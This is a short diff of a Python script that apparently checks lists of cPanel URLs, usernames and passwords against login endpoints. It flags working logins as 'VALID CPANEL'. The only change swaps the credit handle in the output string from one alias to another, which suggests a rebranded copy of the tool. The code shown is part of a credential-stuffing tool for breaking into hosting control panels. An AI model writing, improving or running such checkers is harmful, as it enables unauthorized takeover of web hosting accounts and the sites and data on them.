@@ -59,7 +59,7 @@ def checker(line):
     try:
         r = requests.post(url,headers=head,data=data,allow_redirects=False).text
 
-        result = f'URL: {miniurl}\nUSER: {user}\nPASS: {passw}\n[>] Checked By @medployboy\n\n'
+        result = f'URL: {miniurl}\nUSER: {user}\nPASS: {passw}\n[>] Checked By @simosaper11\n\n'
 
         if '{"notices":[]' in r or 'security_token":"' in r:
             print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX} VALID CPANEL ')
